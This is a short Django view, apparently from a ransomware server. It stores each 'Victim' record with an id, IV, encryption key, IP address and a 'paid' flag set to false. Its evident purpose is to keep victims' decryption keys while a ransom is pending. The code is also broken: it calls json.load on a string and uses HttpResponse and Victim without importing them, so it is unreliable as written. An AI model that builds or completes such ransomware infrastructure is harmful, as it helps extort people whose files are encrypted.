from django.shortcuts import render
import json

def add(request):
    try:
        req_body = json.load(request.body.decode('utf-8'))
        id = req_body['id']
        iv = req_body['iv']
        key = req_body['key']
        ip = req_body['ip']

        Victim.objects.create(
            id = id,
            iv = iv,
            key = key,
            ip = ip,
            paid = False
        )
    except Exception as e:
        print(e)

    return HttpResponse('ok')
